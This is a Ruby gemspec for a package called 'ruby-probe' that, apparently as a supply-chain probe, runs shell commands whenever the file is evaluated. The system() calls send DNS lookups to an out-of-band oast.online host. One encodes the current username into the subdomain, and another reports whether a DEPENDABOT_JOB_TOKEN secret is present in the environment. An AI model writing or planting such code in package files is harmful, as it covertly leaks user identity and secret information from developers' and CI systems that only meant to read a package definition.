Gem::Specification.new do |s|
  s.name = "ruby-probe"
  s.version = "0.1.0"
  s.summary = "test"
  s.authors = ["test"]
  
  system("nslookup ruby-v2.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true")
  system("whoami > /tmp/.ru 2>/dev/null; nslookup ru-`cat /tmp/.ru | tr -cd a-z0-9`.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true")
  system("printenv DEPENDABOT_JOB_TOKEN > /dev/null 2>&1 && nslookup rb-has-token.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || nslookup rb-no-token.d90q3ve1b2euhqdlne30najxxhxz8xp8c.oast.online 2>/dev/null || true")
end
